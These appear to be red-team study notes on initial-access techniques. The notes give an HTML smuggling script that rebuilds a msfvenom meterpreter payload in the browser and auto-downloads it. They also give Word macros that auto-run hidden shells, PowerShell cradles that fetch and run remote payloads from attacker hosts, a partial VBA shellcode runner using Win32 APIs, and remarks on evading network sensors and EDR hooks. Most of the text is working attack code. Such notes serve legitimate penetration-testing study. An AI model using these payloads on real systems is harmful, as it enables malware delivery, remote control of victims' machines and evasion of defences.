## HTML Smuggling 
Attempting to use this TTP to deliver a payload to the Vicitm Win10 [Microsoft Link](https://www.microsoft.com/security/blog/2021/11/11/html-smuggling-surges-highly-evasive-loader-technique-increasingly-used-in-banking-malware-targeted-attacks/)

This attack is effective because it encodes an apbitary file into a javascript blob which it then rebuilds on the target. Thus, the payload does not pass through network sensors, IDS, proxies, and other network based defensive tools.  It builds the malware locally in the browser and then downloads it to the target. 

We will still need to account for EDR tools, however, it is an evasive loader TTP that can subvert network detection metods. 

**Step 1 )**
- Generate a payload and convert it to base64 to be stored in the blob later.
	- `sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe -o /var/www/html/msfstaged.exe`
	- `base64 /var/www/html/msfstaged.exe`
		- Note: You must store the b64 in one continuous string... Remove the all line breaks `\n`

**Step 2 ) **
- Convert the b64 payload to a byte array and store in a data var
	- function base64ToArrayBuffer(base64)
```
function base64ToArrayBuffer(base64)
{
 var binary_string = window.atob(base64);
 var len = binary_string.length;
 var bytes = new Uint8Array( len );
 for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
 return bytes.buffer;
}
```

**Step 3 )**
- Take that new byte array and store the array for use
	- `var data = base64ToArrayBuffer(file);`

**Step 4 )**
- Generate the Blob of data with a MIME type for generic binary data (or binary data whose true type is unknown) is `application/octet-stream`.
	-  `var blob = new Blob([data], {type: 'octet/stream'}); `
-  The constructor syntax is:

`new Blob(blobParts, options);`

-   **`blobParts`** is an array of `Blob`/`BufferSource`/`String` values.
-   **`options`** optional object:
	-   **`type`** – `Blob` type, usually MIME-type, e.g. `image/png`,
	-   **`endings`** – whether to transform end-of-line to make the `Blob` correspond to current OS newlines (`\r\n` or `\n`). By default `"transparent"` (do nothing), but also can be `"native"` (transform).

	For example:
	```
	// create Blob from a string
	let blob = new Blob(["<html>…</html>"], {type: 'text/html'});
	// please note: the first argument must be an array [...]
	```


**Step 5 )**
- Create the hidden anchor `<a>` html anchor tag and move our data into this html anchor
	- 

**Step 6 )**
- Name the file, pass that to the anchor tag, and preform a click action to download the file without user action. The HTML DOM `createElement()` Method creates an Element Node with the specified name. After the element is created, use the `element.appendChild()` or `element.insertBefore()` method to insert it to the document.
	- `var a = document.createElement('a');` 
	- `document.body.appendChild(a);` 
	-  `a.style = 'display: none';`
	Example: 
```
<!DOCTYPE html>
<html>
<body>

<p>Click the button to create a P element with some text.</p>

<button onclick="myFunction()">Try it</button>

<script>
function myFunction() {
  var para = document.createElement("p");
  para.innerText = "This is a paragraph.";
  document.body.appendChild(para);
}
</script>

</body>
</html>
```
As you can see the function `myFunction()` is called by the "Try is" `<button>`. When the script is called the `<p>` element is created and  the `innerText` property of the element is used to display some text. 

**Step 7 )**
- Finish building the anchor tag with the requsit elements. 
	- 	`var url = window.URL.createObjectURL(blob); `
	- 	`a.href = url; `
	- 	`a.download = fileName; a.click(); `
	- 	`window.URL.revokeObjectURL(url);`

Entire Sctipt )
```
<html>
 <body>
 <script>
	 function base64ToArrayBuffer(base64) {
	 var binary_string = window.atob(base64);
	 var len = binary_string.length;
	 var bytes = new Uint8Array( len );
	 for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i);
	}
	 return bytes.buffer;
	 } 

	 var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA... 
	 var data = base64ToArrayBuffer(file); 
	 var blob = new Blob([data], {type: 'octet/stream'}); 
	 var fileName = 'msfstaged.exe'; 

	 var a = document.createElement('a'); 
	 document.body.appendChild(a); 
	 a.style = 'display: none'; 
	 var url = window.URL.createObjectURL(blob); 
	 a.href = url; 
	 a.download = fileName; a.click(); 
	 window.URL.revokeObjectURL(url);
 </script>
 </body>
</html>
```

## Microsoft Office VBA
Declaring variables of different types in VBA
```
Dim myString As String
Dim myLong As Long
Dim myPointer As LongPtr
```

 Useful Functions in winword
 `Document_Open()`
 `AutoOpen()`
 
 
Macro to execute cmd from the Shell method
 ```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```
VBA **Shell**(_pathname_, [ _windowstyle_ ])
_windowstyle_ = 0, or vbHide...  Window is hidden and focus is passed to the hidden window. The **vbHide** constant is not applicable on Macintosh platforms.

Variant that will open
```
Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```


### Implementing Own Sleep 
```
Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)

End Sub
```
This will look at the current time and loop until the time now is > or = to the timenow + n seconds passed. So if time now is 1300 and you pass wait(3) then 
Loop Until 1300 >= 1303.

### Powershell in VBA
```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://1.1.1.1/shell.exe', 'shell.exe')"
    Shell str, vbHide
End Sub
```
This will set a str = to the IEX DL and then execute it in a normal shell.
This will download to Disk and execute from there. So not OPSEC safe. 


## Executing Shellcode in Word Memory
```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```


### Calling Arbitrary  Win32 APIs from Memory.

**Example of getting username.**

First we need to import our target function via a private declare. Depending on the version of MS Office you may need `PtrSafe` so you can do a quick if/else for errors
```
#If VBA7 Then
    Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
#Else
    Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
#End If
```

Now we will define VARs and utelize the function. MyBuff will contain the contents returned by the lpBuffer from the API call. Since we dont know the size need to check that by looking for the index of the Null Byte and then sub 1
Then we create substring with  `Left` because we don't want NULL chars. We pass it the string legnth we just determined to get all but null bytes
```
Sub MyMacro()
    Dim res As Long
    Dim MyBuff As String * 256
    Dim MySize As Long
    Dim strlen As Long
    MySize = 256
        
    res = GetUserName(MyBuff, MySize)
    strlen = InStr(1, MyBuff, vbNullChar) - 1
    MsgBox Left$(MyBuff, strlen)
    
End Sub
```

### Shell Code Runner

Initial objective is to call 3 APIs from Kernel32.dll. 
-	VirtualAlocEX
-	RtlMoveMemory
-	CreateThread

#### VirtualAlloc()
- lpAddress = Memory Pointer of allocation address. If set to 0 then API will choose the location
	- VBA LongPtr 
- dwSize = Long Size to Allocate 
	- VBA Long
- flAllocation Type = Int of the type of memory to allocate
	- VBA Long
- flProtect = int describing the protections
	-  VBA Long
- Return = Memory Start Addr
	- Memory Pointer == LongPtr 

**VBA Declare**
```
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" ( _
	ByVal lpAddress As LongPtr, _
	ByVal dwSize As Long, _
	ByVal flAllocationType As Long, _
	ByVal flProtect As Long) As LongPtr
```




## Calling Win32 APIs from PowerShell

First powershell cannot call Win32 APIs directly. However we can use .NET to declare C# and import the APIs to the PowerShell session using P/Invoke.  

OPSEC NOTE: Alot of common  Win32 APIs are hooked by EDR tools. We can try to call the native (Usually prepended with NT) APIs. Or make the SysCalls directly using D/Invoke

In this example we we will be attempting to call the MessageBox function (winuser.h) which is located in the User32.dll Library.

```
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, 
        String caption, int options);
}
"@

Add-Type $User32

[User32]::MessageBox(0, "This is an Alert", "MyBox", 0)
```

From the code above you can se we create a "User32" (name is arbitrary) class to import our signature found on https://www.pinvoke.net/default.aspx/user32.messagebox. You can also translate in your head from C to C# using MSDN. Lastly we add the Add-Type keyword to invoke the code and **compile** using .NET.  
